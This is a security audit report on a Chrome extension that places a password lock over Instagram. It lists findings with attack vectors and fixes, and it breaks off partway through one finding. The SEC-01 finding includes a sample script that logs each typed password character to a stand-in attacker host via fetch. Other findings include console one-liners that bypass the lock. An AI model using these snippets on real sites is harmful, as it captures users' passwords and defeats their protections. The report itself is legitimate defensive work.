# Master Implementation Audit & Recommendations Report: Instagram Lock Chrome Extension (Manifest V3)

**Target Application**: Instagram Lock - Password Protection (`v1.0.0`)  
**Platform**: Google Chrome Extension (Manifest V3)  
**Date**: November 10, 2026  
**Audit Scope**: Security, Architecture, MV3 Compliance, Code Quality, Edge Cases, User Experience, Test Suite Health, and Future Feature Roadmap (R1 & R2)  
**Repository Root**: `d:\02_DEVELOPMENT\Projects_Personal\InstaLockExt`  
**Test Suite Status**: 12/12 Unit Tests Passing (`tests/crypto.test.js`)  

---

## Executive Summary

A comprehensive, multi-dimensional audit of the **Instagram Lock** Chrome extension (`v1.0.0`) was performed to evaluate its architectural soundness, cryptographic integrity, Manifest V3 compliance, edge-case resilience, user experience, accessibility, and test suite health.

The extension is designed to protect Instagram Web sessions (`https://*.instagram.com/*`) using an offline master password, an anti-FOUC (Flash of Unauthenticated Content) preloader shield, session-scoped credential isolation in `chrome.storage.session`, and automatic inactivity locking orchestrated by `chrome.alarms` and `chrome.idle`.

### Architectural Scorecard

| Dimension | Evaluation | Summary Verdict |
| :--- | :---: | :--- |
| **Cryptographic Subsystem** | **A-** | Sound offline PBKDF2-HMAC-SHA256 implementation using native Web Crypto API (`crypto.subtle`), 128-bit CSPRNG salts, and timing-safe constant-time string comparison. Inadequate minimum password policy (4 chars) and iteration count (100k vs 600k OWASP). |
| **DOM Isolation & Guarding** | **F / Critical** | **Two Critical Vulnerabilities**: Open Mode Shadow DOM (`mode: 'open'`) exposes password input directly to web page scripts for keylogging/exfiltration; MutationObserver DOM guard specifies `subtree: false` on `documentElement` while attaching to `body`, completely missing removal or CSS hiding of the lock screen. Anti-FOUC preloader fails open on import error. |
| **IPC & Message Handling** | **D / High Risk** | Service worker message router verifies `sender.id === chrome.runtime.id` but completely lacks role/context checks. Unprivileged content scripts executing in web pages can send administrative IPC messages (`SET_PASSWORD`, `CHANGE_PASSWORD`, `UPDATE_SETTINGS`). |
| **Concurrency & Synchronization** | **C+** | Multi-tab broadcasts synchronize active tabs. However, a Time-of-Check to Time-of-Use (TOCTOU) race condition exists in password verification and failed attempt counters, and lockout countdown timers desynchronize across tabs and upon tab reload. |
| **Manifest V3 Lifecycle** | **B** | Background service worker is 100% stateless (zero mutable module-level variables), ensuring survival across ephemeral restarts. However, lacks `chrome.runtime.onStartup`, exposes wildcards in `web_accessible_resources`, and requests broad `tabs` permission instead of scoped host permissions. |
| **User Experience & Accessibility** | **C** | High visual polish matching Instagram dark aesthetic. However, contains a critical focus trapping bug in Shadow DOM (`document.activeElement`), fails OS workstation locking (`Win + L`), causes blank screen latency on reload, and fails WCAG 2.1 AA accessibility standards. |
| **Test Suite Health** | **D / Severe Gap** | Existing tests in `tests/crypto.test.js` pass (12/12), but test suite covers **only 1 of 13 JavaScript files** (`shared/crypto.js`). 100% of background managers, content scripts, and UI controllers have **0% automated test coverage**. `tests/runner.html` is out of sync with CLI tests (only 8 tests). |

---

## Master Findings Catalog

| Finding ID | Domain | Severity | Affected Component(s) & Lines | Title / Summary |
| :--- | :--- | :---: | :--- | :--- |
| **SEC-01** | Security | **CRITICAL** | `content/lock-screen.js:47` | Open Mode Shadow DOM Exposes Master Password Input to Page Scripts |
| **SEC-02** | Security | **CRITICAL** | `content/content-main.js:105-115`<br>`content/lock-screen.js:51-52` | MutationObserver DOM Guard Ineffective Due to `subtree: false` & CSS Overrides |
| **SEC-03** | Security | **CRITICAL** | `content/content-loader.js:50-55` | Content Loader Preloader Shield Fails Open on Initialization Error |
| **SEC-04** | Security | **HIGH** | `shared/messaging.js:28-36`<br>`background/service-worker.js:28-36` | Lack of Role-Based Context Separation in Background IPC Message Router |
| **SEC-05** | Security | **HIGH** | `background/auth-manager.js:71-107` | TOCTOU Concurrency Race Condition in Password Verification & Failed Attempt Counting |
| **SEC-06** | Security | **HIGH** | `background/auth-manager.js:55, 125`<br>`pages/setup.js:67`<br>`options/options.js:81` | Weak Minimum Password Policy (4 Characters) Enables Rapid Brute-Force Cracking |
| **SEC-07** | Security | **MEDIUM** | `shared/constants.js:63-69`<br>`background/auth-manager.js:36-39` | Ineffective Progressive Lockout Architecture (30s Cap, Clock Tampering Bypass) |
| **SEC-08** | Security | **MEDIUM** | `manifest.json:45-55` | Broad `web_accessible_resources` Wildcard Exposes Internals & Enables Fingerprinting |
| **SEC-09** | Security | **MEDIUM** | `manifest.json:34-44` | Missing Frame Protection (`all_frames: false`) Leaves Iframed Instagram Views Unprotected |
| **SEC-10** | Security | **MEDIUM** | `background/service-worker.js:68, 79, 125`<br>`shared/storage.js:141-146` | Unbounded Input Length & Missing Settings Schema Validation |
| **SEC-11** | Security | **LOW** | `shared/constants.js:53-58` | PBKDF2 Iteration Count (100,000) Below Current OWASP Recommendations (600,000) |
| **SEC-12** | Security | **INFORMATIONAL**| Architecture / Platform Scope | Threat Model Boundary: Presentation Layer vs Local Disk SQLite Cookie Extraction |
| **MV3-01** | MV3 | **HIGH** | `background/service-worker.js` | Missing `chrome.runtime.onStartup` Listener for Session and Alarm Re-synchronization |
| **MV3-02** | MV3 | **MEDIUM** | `manifest.json:11-16` | Over-Privileged `tabs` Permission Triggers Invasive Store Warning |
| **MV3-03** | MV3 | **MEDIUM** | `background/inactivity-manager.js:26-28` | Background Alarm 1-Minute Resolution & Jitter Creates Inactivity Window |
| **MV3-04** | MV3 | **LOW** | Network Layer Architecture | Absence of Declarative Net Request Allows Network Data Fetching Prior to Unlock |
| **CQ-01** | Code Quality | **LOW** | Multiple Files | Magic Numbers (Password Length) and Duplicate SVG Path Strings |
| **CQ-02** | Code Quality | **LOW** | `shared/storage.js:85-95` | Asymmetric Error Handling in Storage Helpers (Swallowed vs Re-thrown Errors) |
| **CQ-03** | Code Quality | **LOW** | `content/lock-screen.js:384` | Unhandled Promise Rejection on Lock Screen Setup Link Click |
| **EDG-01** | Edge Cases | **HIGH** | `content/content-main.js`<br>`content/activity-tracker.js` | Orphaned Content Scripts on Extension Update/Reload Leave Instagram Permanently Unlocked |
| **EDG-02** | Edge Cases | **MEDIUM** | `manifest.json` | Default Incognito Spanning Mode Compromises Private Session Isolation |
| **EDG-03** | Edge Cases | **MEDIUM** | `background/inactivity-manager.js` | Windows Background App Mode Retains Ephemeral Session Across Browser Window Closures |
| **EDG-04** | Edge Cases | **LOW** | `shared/messaging.js:43-58` | Multi-Tab Broadcast Race During Preloader Tab Loading |
| **EDG-05** | Edge Cases | **LOW** | `content/content-main.js:118-125` | Incomplete SPA Route Navigation Interception (`popstate` without `pushState`) |
| **UX-01** | User Experience| **HIGH** | `content/lock-screen.js:467-471` | Shadow DOM Focus Trap Bug Checks `document.activeElement` Instead of Shadow Root |
| **UX-02** | User Experience| **HIGH** | `background/inactivity-manager.js:69-74` | Workstation Screen Lock (`Win + L`) Fails to Lock Session Immediately |
| **UX-03** | User Experience| **HIGH** | `content/content-main.js:60`<br>`content/lock-screen.js:379` | Lockout Countdown Desynchronization on Page Reload (Enabled Inputs on Refresh) |
| **UX-04** | User Experience| **MEDIUM** | `content/lock-screen.js:489-520` | Multi-Tab Lockout Timer Desynchronization Across Open Tabs |
| **UX-05** | User Experience| **MEDIUM** | `content/content-loader.js:14-18` | Anti-FOUC Preloader Blank Screen Latency (50ms–250ms) on Authenticated Reloads |
| **UX-06** | User Experience| **MEDIUM** | `content/lock-screen.js:345, 360` | Accessibility Gaps: Missing Form Labels, Missing ARIA Live Regions, Color Contrast (< 4.5:1) |
| **UX-07** | User Experience| **MEDIUM** | `content/lock-screen.js:399-403` | Password Visibility Toggle Fails to Change Icon Shape (Opacity Only) |
| **UX-08** | User Experience| **MEDIUM** | `content/lock-screen.js:118-123` | Modal Card Responsive Viewport Clipping on Small Screen Heights (<= 450px) |
| **UX-09** | User Experience| **LOW** | `options/options.html`, `options/options.js` | Settings UI Requires Manual Save and Lacks Password Strength Meter / Eye Toggles |
| **UX-10** | User Experience| **LOW** | `popup/popup.html`, `popup/popup.js` | Popup Lacks Direct Unlock Capability and Dynamic Storage Sync |
| **TST-01** | Testing | **HIGH** | Entire Repository (12 Files) | 92% Codebase Untested: Zero Test Coverage Across Background, Content, and UI Tiers |
| **TST-02** | Testing | **LOW** | `tests/runner.html:54-87` | Test Harness Discrepancy: `runner.html` (8 tests) Omits 4 Assertions Present in CLI Suite |

---

## Section 1: In-Depth Security Audit (R1)

### SEC-01: Open Mode Shadow DOM Exposes Master Password Input to Page Scripts
- **Severity**: **CRITICAL** (CVSS 8.8 / CWE-200, CWE-522)
- **Affected File & Lines**: `content/lock-screen.js:47`
- **Technical Description**:
  The custom lock screen modal is encapsulated inside a Shadow DOM attached to `#ig-lock-screen-host`:
  ```javascript
  // content/lock-screen.js:47
  this.shadowRoot = this.hostElement.attachShadow({ mode: 'open' });
  ```
  When a Shadow Root is attached with `mode: 'open'`, any script running in the main web page context (including Instagram's first-party React code, third-party tracking scripts, or injected malicious extensions/XSS payloads) can traverse into the shadow root via the host element's `.shadowRoot` property.
- **Exploitation / Attack Vector**:
  Any web script on `https://www.instagram.com/*` can execute:
  ```javascript
  const host = document.getElementById('ig-lock-screen-host');
  if (host && host.shadowRoot) {
    const input = host.shadowRoot.querySelector('#ig-lock-input');
    input.addEventListener('input', (e) => {
      // Exfiltrates the user's master password in plaintext as it is typed
      fetch('https://attacker-controlled.site/log?key=' + encodeURIComponent(e.target.value));
    });
  }
  ```
  Page scripts can also programmatically click `#ig-unlock-btn`, remove the modal nodes, or read entered credentials.
- **Remediation**:
  Change the encapsulation mode from `'open'` to `'closed'`:
  ```javascript
  // Fix in content/lock-screen.js:47:
  this.shadowRoot = this.hostElement.attachShadow({ mode: 'closed' });
  ```
  In `'closed'` mode, `hostElement.shadowRoot` evaluates to `null` in the page context, while the content script retains access through the local reference `this.shadowRoot`.

---

### SEC-02: MutationObserver DOM Guard Ineffective Due to `subtree: false` & CSS Overrides
- **Severity**: **CRITICAL** (CVSS 8.2 / CWE-693)
- **Affected Files & Lines**: `content/content-main.js:105-115`, `content/lock-screen.js:51-52`
- **Technical Description**:
  To prevent users or malicious scripts from bypassing the lock screen, `content-main.js` initializes a `MutationObserver`:
  ```javascript
  // content/content-main.js:105-115
  const observer = new MutationObserver(() => {
    if (isCurrentlyLocked && !lockScreen.isMounted()) {
      console.warn('[IG-Lock Guard] Lock screen was detached while locked. Re-attaching.');
      lockScreen.mount(true);
    }
  });

  observer.observe(document.documentElement, {
    childList: true,
    subtree: false
  });
  ```
  However, in `content/lock-screen.js:51-52`:
  ```javascript
  const target = document.body || document.documentElement;
  target.appendChild(this.hostElement);
  ```
  Once the HTML document parses `<body>`, `target` is `document.body`. `#ig-lock-screen-host` is mounted as a direct child of `<body>`.
  Because `observer.observe` is attached to `document.documentElement` (`<html>`) with `subtree: false`, it observes **only direct children of `<html>`** (`<head>` and `<body>`). Any modification, deletion, or detachment of children inside `<body>` **never triggers the observer**!
  Furthermore, `lockScreen.isMounted()` simply executes `document.contains(this.hostElement)`. Applying `display: none !important` or `visibility: hidden !important` leaves the element attached to the DOM tree, meaning `isMounted()` returns `true` and the observer remains silent.
- **Exploitation / Attack Vector**:
  A user or script can execute either of the following in the console:
  1. `document.getElementById('ig-lock-screen-host').remove();` (Never re-mounted because `documentElement` childList is untouched).
  2. `document.getElementById('ig-lock-screen-host').style.setProperty('display', 'none', 'important');` (Instantly reveals Instagram behind the overlay).
- **Remediation**:
  1. Observe `document.documentElement` with `subtree: true` and monitor `attributes` (`style`, `class`, `hidden`).
  2. Implement an active visibility check (`isLockEffectivelyMounted`) in `content-main.js`:
  ```javascript
  function setupDomGuard() {
    const observer = new MutationObserver(() => {
      if (isCurrentlyLocked) {
        const host = document.getElementById('ig-lock-screen-host');
        if (!host || !document.contains(host)) {
          console.warn('[IG-Lock Guard] Lock host detached. Re-mounting.');
          lockScreen.mount(true);
        } else {
          const style = window.getComputedStyle(host);
          if (style.display === 'none' || style.visibility === 'hidden' || parseFloat(style.opacity) < 0.5) {
            host.style.setProperty('display', 'block', 'important');
            host.style.setProperty('visibility', 'visible', 'important');
            host.style.setProperty('opacity', '1', 'important');
          }
        }
      }
    });

    observer.observe(document.documentElement, {
      childList: true,
      subtree: true,
      attributes: true,
      attributeFilter: ['style', 'class', 'hidden']
    });
  }
  ```

---

### SEC-03: Content Loader Preloader Shield Fails Open on Initialization Error
- **Severity**: **CRITICAL** (CVSS 7.9 / CWE-636)
- **Affected File & Lines**: `content/content-loader.js:50-55`
- **Technical Description**:
  `content-loader.js` runs at `document_start` and injects `#ig-lock-preloader-shield`, hiding the `body` while `content-main.js` is imported. If loading fails, it catches the error and executes:
  ```javascript
  // content/content-loader.js:50-55
  } catch (err) {
    console.error('[IG-Lock] Failed to load content module:', err);
    // Remove shield in case of unexpected loader failure
    style.remove();
    document.documentElement.classList.remove('ig-lock-shield-active');
  }
  ```
  This is a **fail-open** design. If an error occurs (such as a syntax error, network failure, or corrupted dynamic module), the protective shield is removed and Instagram content is fully displayed to the unauthenticated user.
- **Remediation**:
  Adopt a **fail-closed** architecture. If initialization fails, replace the page contents with a secure error veil:
  ```javascript
  } catch (err) {
    console.error('[IG-Lock Security] Initialization failed. Enforcing fail-closed state:', err);
    // Retain shield; render recovery veil
    document.documentElement.innerHTML = `
      <div style="background:#000;color:#fff;height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif;">
        <div style="text-align:center;">
          <h2>Instagram Lock Error</h2>
          <p>Extension initialization failed. Please reload the page.</p>
        </div>
      </div>
    `;
  }
  ```

---

### SEC-04: Lack of Role-Based Context Separation in Background IPC Message Router
- **Severity**: **HIGH** (CVSS 7.7 / CWE-285)
- **Affected Files & Lines**: `shared/messaging.js:28-36`, `background/service-worker.js:28-135`
- **Technical Description**:
  `shared/messaging.js` defines sender verification:
  ```javascript
  export function isTrustedSender(sender) {
    if (!sender) return false;
    if (sender.id !== chrome.runtime.id) {
      return false;
    }
    return true;
  }
  ```
  In Manifest V3, both extension privileged pages (`chrome-extension://<id>/*`) AND content scripts injected into web pages execute with `sender.id === chrome.runtime.id`.
  `isTrustedSender` performs no role or origin verification. Consequently, the service worker treats messages originating from content scripts with the same privileges as internal extension options pages!
- **Exploitation / Attack Vector**:
  Any script executing in the content script context can issue:
  ```javascript
  // Disables auto-lock entirely from inside the Instagram tab!
  chrome.runtime.sendMessage({
    action: 'IG_LOCK_UPDATE_SETTINGS',
    settings: { autoLockEnabled: false, timeoutMinutes: 0 }
  });
  ```
  It can also trigger `ACTIONS.SET_PASSWORD` or attempt `ACTIONS.CHANGE_PASSWORD`.
- **Remediation**:
  Define privileged contexts in `shared/messaging.js` and enforce role checks in `service-worker.js`:
  ```javascript
  export function isPrivilegedExtensionContext(sender) {
    if (!sender || sender.id !== chrome.runtime.id) return false;
    // Privileged contexts (popup, options, setup) do NOT have a sender.tab
    return !sender.tab && sender.url && sender.url.startsWith(`chrome-extension://${chrome.runtime.id}/`);
  }
  ```
  In `service-worker.js`, reject sensitive actions (`SET_PASSWORD`, `CHANGE_PASSWORD`, `UPDATE_SETTINGS`, `GET_SETTINGS`) if received from a sender containing `sender.tab`.

---

### SEC-05: TOCTOU Concurrency Race Condition in Password Verification & Failed Attempt Counting
- **Severity**: **HIGH** (CVSS 7.4 / CWE-362)
- **Affected File & Lines**: `background/auth-manager.js:71-107`
- **Technical Description**:
  `AuthManager.verify()` executes the following asynchronous sequence:
  1. Line 72: `const lockout = await this.checkLockout();` (Checks if locked out).
  2. Line 89: `const isValid = await verifyPassword(candidatePassword, salt, hash);` (PBKDF2 computation takes ~80–120ms).
  3. Lines 100-107:
     ```javascript
     const failedAttempts = (await getLocal(STORAGE_KEYS.LOCAL.FAILED_ATTEMPTS, 0)) + 1;
     const penaltySeconds = getLockoutDuration(failedAttempts);
     const lockoutUntil = penaltySeconds > 0 ? Date.now() + penaltySeconds * 1000 : 0;
     await setLocalMulti({
       [STORAGE_KEYS.LOCAL.FAILED_ATTEMPTS]: failedAttempts,
       [STORAGE_KEYS.LOCAL.LOCKOUT_UNTIL]: lockoutUntil
     });
     ```
  Because the read of `failedAttempts` occurs after the long PBKDF2 calculation, firing 20 concurrent verification requests results in all 20 checking lockout at step 1 before any lockout is registered. All 20 read the initial `failedAttempts` (e.g. 0), increment to 1, and write 1. The progressive lockout penalty is completely evaded.
- **Remediation**:
  Introduce a promise-based serialization mutex in `background/auth-manager.js`:
  ```javascript
  let verificationQueue = Promise.resolve();

  export class AuthManager {
    static async verify(candidatePassword) {
      // Serialize all verification attempts atomically
      const currentTask = verificationQueue.then(() => this._executeVerify(candidatePassword));
      verificationQueue = currentTask.catch(() => {});
      return currentTask;
    }

    static async _executeVerify(candidatePassword) {
      // original verification logic
    }
  }
  ```

---

### SEC-06: Weak Minimum Password Policy (4 Characters) Enables Rapid Brute-Force Cracking
- **Severity**: **HIGH** (CVSS 7.1 / CWE-521)
- **Affected Files & Lines**: `background/auth-manager.js:55, 125`, `pages/setup.js:67`, `options/options.js:81`
- **Technical Description**:
  The application permits 4-character passwords (`password.length < 4`).
  A 4-digit PIN keyspace is only $10^4 = 10,000$. A 4-character alphanumeric password keyspace is $62^4 \approx 14.7 \times 10^6$.
  An adversary with local machine access who reads the PBKDF2 hash and salt from `chrome.storage.local` (persisted in plaintext LevelDB) can crack this keyspace in seconds on modern GPUs.
- **Remediation**:
  Raise the minimum length requirement to at least 8 characters (ideally 10+) and require at least two character classes:
  ```javascript
  // Centralize in shared/constants.js:
  export const MIN_PASSWORD_LENGTH = 8;
  ```

---

### SEC-07: Ineffective Progressive Lockout Architecture (30s Cap, Clock Tampering Bypass)
- **Severity**: **MEDIUM** (CVSS 5.3 / CWE-307)
- **Affected Files & Lines**: `shared/constants.js:63-69`, `background/auth-manager.js:36-39`
- **Technical Description**:
  1. In `shared/constants.js:63-69`, `getLockoutDuration` caps the penalty at **30 seconds** for 6 or more failed attempts. This allows an automated attacker to submit continuous guesses at 120 attempts per hour.
  2. In `auth-manager.js:36-39`, `lockoutUntil` is evaluated against `Date.now()`. Advancing the local system clock immediately bypasses active lockouts.
- **Remediation**:
  1. Implement exponential backoff (e.g., 3 fails = 30s; 5 fails = 5m; 8 fails = 30m; 10+ fails = 24h lockout).
  2. Enforce monotonic uptime or alarm verification to mitigate OS clock adjustments.

---

### SEC-08: Broad `web_accessible_resources` Wildcard Exposes Internals & Enables Fingerprinting
- **Severity**: **MEDIUM** (CVSS 5.3 / CWE-200)
- **Affected File & Lines**: `manifest.json:45-55`
- **Technical Description**:
  `manifest.json` exposes `"content/*"` and `"shared/*"` to `https://*.instagram.com/*`:
  ```json
  "web_accessible_resources": [
    {
      "resources": ["content/*", "shared/*"],
      "matches": ["https://*.instagram.com/*"]
    }
  ]
  ```
  Any script running on Instagram can probe these URLs to fingerprint extension presence and exfiltrate source code. The manifest also omits `"use_dynamic_url": true`.
- **Remediation**:
  Bundle content script modules so that dynamic imports (`await import(...)`) are not required. Remove `web_accessible_resources` completely, or add `"use_dynamic_url": true` if specific assets are necessary.

---

### SEC-09: Missing Frame Protection (`all_frames: false`) Leaves Iframed Instagram Views Unprotected
- **Severity**: **MEDIUM** (CVSS 5.3 / CWE-1021)
- **Affected File & Lines**: `manifest.json:34-44`
- **Technical Description**:
  `content_scripts` in `manifest.json` does not specify `"all_frames": true`. If Instagram pages (or endpoints like `/direct/inbox/`) are loaded inside an iframe on an allowed domain or embedded context, the content script does not run, leaving the framed content unprotected.
- **Remediation**:
  Add `"all_frames": true` to the `content_scripts` declaration in `manifest.json`.

---

### SEC-10: Unbounded Input Length & Missing Settings Schema Validation
- **Severity**: **MEDIUM** (CVSS 4.8 / CWE-20)
- **Affected Files & Lines**: `background/service-worker.js:68, 79, 125`, `shared/storage.js:141-146`
- **Technical Description**:
  1. Password fields have no maximum length validation. Passing a 10MB string to `ACTIONS.VERIFY_PASSWORD` causes PBKDF2 to choke the service worker CPU, risking Denial of Service.
  2. `saveSettings()` shallow-merges arbitrary incoming objects into `chrome.storage.local` without validating types or bounds on `timeoutMinutes`, `autoLockEnabled`, or `lockOnClose`.
- **Remediation**:
  Enforce max password length (e.g. 128 characters) and validate setting types strictly:
  ```javascript
  const ALLOWED_TIMEOUTS = new Set([0, 1, 5, 10, 15, 30, 60]);
  if (!ALLOWED_TIMEOUTS.has(settings.timeoutMinutes)) {
    throw new Error('Invalid timeout configuration.');
  }
  ```

---

### SEC-11: PBKDF2 Iteration Count (100,000) Below Current OWASP Recommendations (600,000)
- **Severity**: **LOW** (CVSS 3.7 / CWE-326)
- **Affected File & Lines**: `shared/constants.js:53-58`
- **Technical Description**:
  `CRYPTO_CONFIG.ITERATIONS = 100000`. OWASP Password Storage Guidelines (2023) recommend 600,000 iterations for PBKDF2-HMAC-SHA256. Web Crypto executes 600,000 iterations in ~200ms on modern processors, which is imperceptible to users on login while sextupling offline brute-force cost.
- **Remediation**:
  Increase `ITERATIONS` to 600,000 and include a key migration routine for existing installations.

---

### SEC-12: Inherent Platform Boundaries & Threat Model Scope
- **Severity**: **INFORMATIONAL** (Threat Model Clarification)
- **Affected Component**: Architecture / Threat Model
- **Technical Description**:
  A browser extension operates within the browser runtime:
  1. Physical access to an unlocked Chrome profile allows disabling the extension via `chrome://extensions/` unless managed by enterprise policy.
  2. The extension provides presentation-layer locking; it does not encrypt Instagram session cookies in Chrome's SQLite database.
  3. The legitimate threat model of Instagram Lock is **shoulder-surfing deterrence and casual physical privacy protection** on shared devices.

---

## Section 2: Manifest V3 Compliance & Service Worker Lifecycle (R1)

### MV3-01: Missing `chrome.runtime.onStartup` Listener
- **Severity**: **HIGH** (Lifecycle Defect)
- **Affected File**: `background/service-worker.js`
- **Technical Description**:
  `service-worker.js` registers `chrome.runtime.onInstalled`, but omits `chrome.runtime.onStartup`.
  When Google Chrome restarts or restores tabs, `onInstalled` does not fire. Background alarms and session states rely on ad-hoc tab activity. Furthermore, if Windows "Continue running background apps when Google Chrome is closed" is enabled, `chrome.storage.session` might not be reset when browser windows close.
- **Remediation**:
  Add `chrome.runtime.onStartup` in `background/service-worker.js`:
  ```javascript
  chrome.runtime.onStartup.addListener(async () => {
    console.log('[IG-Lock ServiceWorker] Browser startup. Ensuring locked state.');
    await SessionManager.lock();
    await InactivityManager.syncAlarm();
  });
  ```

---

### MV3-02: Over-Privileged `tabs` Permission Triggers Invasive Store Warning
- **Severity**: **MEDIUM** (Least Privilege Violation)
- **Affected File & Lines**: `manifest.json:11-16`
- **Technical Description**:
  `manifest.json` requests the broad `tabs` permission:
  ```json
  "permissions": ["storage", "alarms", "tabs", "idle"]
  ```
  In Manifest V3, querying tabs with `chrome.tabs.query({ url: '*://*.instagram.com/*' })` and sending messages to them does **not** require the `tabs` permission because `host_permissions` for `https://*.instagram.com/*` is already granted.
  Requesting `tabs` triggers the alarming Chrome Web Store install prompt: *"Read your browsing history"*, damaging adoption and raising review scrutiny.
- **Remediation**:
  Remove `"tabs"` from `manifest.json`.

---

### MV3-03: Background Alarm 1-Minute Resolution & Jitter Creates Inactivity Window
- **Severity**: **MEDIUM** (Timing Accuracy Defect)
- **Affected File & Lines**: `background/inactivity-manager.js:26-28`
- **Technical Description**:
  Chrome MV3 limits `chrome.alarms` to a minimum period of 1 minute, and background execution jitter can delay alarms by 1 to 3 minutes under system throttling. If a user sets a 1-minute timeout, the lock screen may not appear for up to 3 minutes if relying solely on the background alarm.
- **Remediation**:
  Maintain a secondary client-side timeout in `content/activity-tracker.js` synchronized with `timeoutMinutes` that immediately queries lock status when local elapsed time crosses the threshold.

---

### MV3-04: Absence of Declarative Net Request Allows Network Data Fetching Prior to Unlock
- **Severity**: **LOW / Architecture Recommendation**
- **Affected Component**: Network Layer
- **Technical Description**:
  Because the extension operates solely via DOM overlay, opening `https://www.instagram.com/direct/inbox/` allows the browser to execute network requests and cache private messages in browser memory before/during lock screen display. Implementing `declarativeNetRequest` rules to block or redirect Instagram API calls when locked would harden data confidentiality.

---

## Section 3: Architecture, Code Quality & DRY Hygiene (R1)

### CQ-01: Magic Numbers and Duplicate SVG Path Strings
- **Severity**: **LOW** (DRY Defect)
- **Affected Files**: `content/lock-screen.js`, `popup/popup.html`, `options/options.html`, `pages/setup.html`, `background/auth-manager.js`
- **Technical Description**:
  1. The 178-character lock icon SVG path is duplicated verbatim across 5 files.
  2. The eye toggle icon SVG is duplicated across 3 files.
  3. The magic number `4` (minimum password length) is hardcoded in 4 locations without centralization.
- **Remediation**:
  Export `ICONS` and `MIN_PASSWORD_LENGTH` from `shared/constants.js`.

---

### CQ-02: Asymmetric Error Handling in Storage Helpers
- **Severity**: **LOW** (Robustness Defect)
- **Affected File & Lines**: `shared/storage.js:85-95`
- **Technical Description**:
  In `shared/storage.js`, `setLocal` and `setSession` re-throw caught exceptions, but `clearSessionAuth()` catches and swallows errors. If `chrome.storage.session.remove` fails, `SessionManager.lock()` completes silently while the session remains unlocked in storage!
- **Remediation**:
  Ensure all storage failure paths re-throw errors or return explicit boolean success indicators.

---

### CQ-03: Unhandled Promise Rejection on Lock Screen Setup Link Click
- **Severity**: **LOW** (Code Hygiene)
- **Affected File & Lines**: `content/lock-screen.js:384`
- **Technical Description**:
  `setupLink.addEventListener('click', () => { sendExtensionMessage(ACTIONS.OPEN_SETUP_PAGE); });` invokes an async function returning a promise that is neither awaited nor caught, risking unhandled promise rejection warnings in the console.

---

## Section 4: Edge Cases, Concurrency & Synchronization (R1)

### EDG-01: Orphaned Content Scripts on Extension Update/Reload Leave Instagram Permanently Unlocked
- **Severity**: **HIGH** (Resilience Failure)
- **Affected Files**: `content/content-main.js`, `content/activity-tracker.js`
- **Technical Description**:
  When an extension is updated or reloaded while an Instagram tab is open and unlocked, the content script's context is invalidated (`chrome.runtime.id` becomes detached).
  The orphaned content script will **never receive subsequent `SYNC_LOCK` broadcasts**. Even if background inactivity expires, the open tab remains permanently unlocked and visible.
- **Remediation**:
  In `activity-tracker.js`, detect context invalidation when sending activity pulses:
  ```javascript
  try {
    if (!chrome.runtime?.id) throw new Error('Context invalidated');
    sendExtensionMessage(ACTIONS.RECORD_ACTIVITY);
  } catch (err) {
    this.stop();
    document.documentElement.style.filter = 'blur(25px)';
    alert('Instagram Lock extension updated. Please refresh tab to continue.');
  }
  ```

---

### EDG-02: Default Incognito Spanning Mode Compromises Private Session Isolation
- **Severity**: **MEDIUM** (Privacy Boundary Defect)
- **Affected File**: `manifest.json`
- **Technical Description**:
  Without `"incognito": "split"`, Manifest V3 defaults to `"spanning"`. In spanning mode, a single background service worker and shared `chrome.storage.session` serve both normal and incognito windows. Unlocking Instagram in normal browsing automatically unlocks Instagram tabs in incognito windows without authentication.
- **Remediation**:
  Configure `"incognito": "split"` or partition authentication tokens by window type.

---

### EDG-03: Windows Background App Mode Retains Ephemeral Session Across Browser Window Closures
- **Severity**: **MEDIUM** (Session Retention Defect)
- **Affected Component**: Background Session Management
- **Technical Description**:
  When Google Chrome on Windows is configured to "Continue running background apps when Google Chrome is closed", closing all browser windows does not terminate the Chrome process. If `lockOnClose` is `false`, reopening Chrome restores active sessions without prompting for password.

---

### EDG-04: Multi-Tab Broadcast Race During Preloader Tab Loading
- **Severity**: **LOW** (Transient Communication Race)
- **Affected File & Lines**: `shared/messaging.js:43-58`
- **Technical Description**:
  When an unlock occurs, `broadcastToInstagramTabs` sends messages to all matching tabs. Tabs in the middle of loading do not yet have listeners registered, causing transient rejected promises. However, state eventually converges because loading tabs execute `ACTIONS.GET_STATUS` on initialization.

---

### EDG-05: Incomplete SPA Route Navigation Interception (`popstate` without `pushState`)
- **Severity**: **LOW** (Event Coverage Gap)
- **Affected File & Lines**: `content/content-main.js:118-125`
- **Technical Description**:
  `content-main.js` listens exclusively to `window.addEventListener('popstate', ...)`. Instagram is a single-page React app that transitions routes using `history.pushState`. Route changes do not dispatch `popstate`, meaning internal client navigations do not trigger lock validation or activity updates.

---

### EDG-06: Offline Resilience & First-Run Setup Flow Analysis
- **Evaluation**: **VERIFIED RESILIENT**
- **Technical Verification**:
  1. **100% Offline Capability**: Web Crypto API executes locally in the browser engine without remote calls. All CSS, HTML, and JS assets are local. The extension functions with zero degradation in disconnected environments.
  2. **First-Run Onboarding**: Navigating to Instagram before setup renders an explicit setup prompt with a direct link to `pages/setup.html`. Feed contents remain shielded.

---

## Section 5: User Experience, Ergonomics & Accessibility (R1)

### UX-01: Shadow DOM Focus Trap Bug Checks `document.activeElement` Instead of Shadow Root
- **Severity**: **HIGH** (Ergonomic / Accessibility Failure)
- **Affected File & Lines**: `content/lock-screen.js:467-471`
- **Technical Description**:
  `LockScreenManager.trapFocus()` implements modal keyboard focus trapping:
  ```javascript
  // content/lock-screen.js:467-471
  if (e.shiftKey && document.activeElement === firstElement) {
    lastElement.focus();
    e.preventDefault();
  } else if (!e.shiftKey && document.activeElement === lastElement) {
    firstElement.focus();
    e.preventDefault();
  }
  ```
  When elements are inside a Shadow DOM, `document.activeElement` returns the host element (`#ig-lock-screen-host`), **never** the shadow elements (`firstElement` or `lastElement`).
  Consequently, `document.activeElement === firstElement` is **always false**. Focus immediately leaks outside the modal into underlying Instagram elements or browser UI on Tab press.
- **Remediation**:
  Replace `document.activeElement` with `this.shadowRoot.activeElement`:
  ```javascript
  // Fix in content/lock-screen.js:467-471:
  const currentActive = this.shadowRoot.activeElement;
  if (e.shiftKey && currentActive === firstElement) {
    lastElement.focus();
    e.preventDefault();
  } else if (!e.shiftKey && currentActive === lastElement) {
    firstElement.focus();
    e.preventDefault();
  }
  ```

---

### UX-02: Workstation Screen Lock (`Win + L`) Fails to Lock Session Immediately
- **Severity**: **HIGH** (Security UX Failure)
- **Affected File & Lines**: `background/inactivity-manager.js:69-74`
- **Technical Description**:
  In `background/inactivity-manager.js`:
  ```javascript
